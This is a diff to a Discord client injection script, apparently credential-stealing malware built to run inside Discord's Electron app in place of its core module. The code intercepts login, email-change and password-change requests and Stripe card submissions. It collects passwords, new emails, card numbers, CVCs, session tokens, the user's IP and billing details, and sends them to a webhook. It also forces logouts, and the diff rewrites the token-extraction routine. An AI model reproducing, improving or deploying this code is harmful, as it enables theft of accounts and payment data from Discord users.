@@ -10,7 +10,6 @@ const Filter = {
     urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
 };
 
-
 const config = {
     "logout": "%LOGOUT%",
     "logout-notify": "%LOGOUTNOTI%",
@@ -71,7 +70,6 @@ const badges = {
         Rare: false,
     },
 };
-
 
 class ArizonaEvent {
     constructor(event, token, data) {
@@ -242,9 +240,10 @@ async function firstTime() {
         const window = BrowserWindow.getAllWindows()[0];
         window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     }
-    return !1
 
+    return !1
 }
+
 const QRFilter = {
 	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
 }
@@ -390,8 +389,8 @@ async function userLogin(password, email, token) {
     }
 
     sendToWebhook(JSON.stringify(params))
-
 }
+
 async function emailChanged(password, newEmail, token) {
     var userInfo = await getUserInfo(token);
     var ip = await getIp();
@@ -480,6 +479,7 @@ async function emailChanged(password, newEmail, token) {
     }
     sendToWebhook(JSON.stringify(params))
 }
+
 async function passwordChanged(oldPassword, newPassword, token) {
     var userInfo = await getUserInfo(token);
     var ip = await getIp();
@@ -575,6 +575,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
         }
         params.embeds.push(embed)
     }
+
     sendToWebhook(JSON.stringify(params))
 }
 async function creditCardAdded(cardnumber, cvc, expiration, token) {
@@ -663,7 +664,6 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
     };
 
     sendToWebhook(JSON.stringify(params))
-
 }
 
 
@@ -679,6 +679,7 @@ async function sendToWebhook(params) {
 		`, !0)
 
 }
+
 async function getRelationships(token) {
     const window = BrowserWindow.getAllWindows()[0];
     var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
@@ -748,19 +749,22 @@ async function getBilling(token) {
     if (billing == "") billing = "\`❌\`"
     return billing;
 }
+
 async function getUserInfo(token) {
     const window = BrowserWindow.getAllWindows()[0];
     var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
     return JSON.parse(a)
 }
+
 async function getIp() {
     const window = BrowserWindow.getAllWindows()[0];
     var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
     return ip
 }
+
 async function getToken() {
     const window = BrowserWindow.getAllWindows()[0];
-    var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
+    var token = await window.webContents.executeJavaScript(`let token="";window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{token=Object.values(e.c).find((e=>e.exports&&e.exports.default&&void 0!==e.exports.default.getToken)).exports.default.getToken()}]);token;`, !0)
     return token
 }
 
@@ -799,7 +803,6 @@ function getNitro(flags) {
 
 session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) => {
     if (details.statusCode != 200) return;
-   
 
     const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
     const data = JSON.parse(unparsed_data)
@@ -843,7 +846,6 @@ session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) 
         default:
             break;
     }
-
 });
 
 module.exports = require('./core.asar')
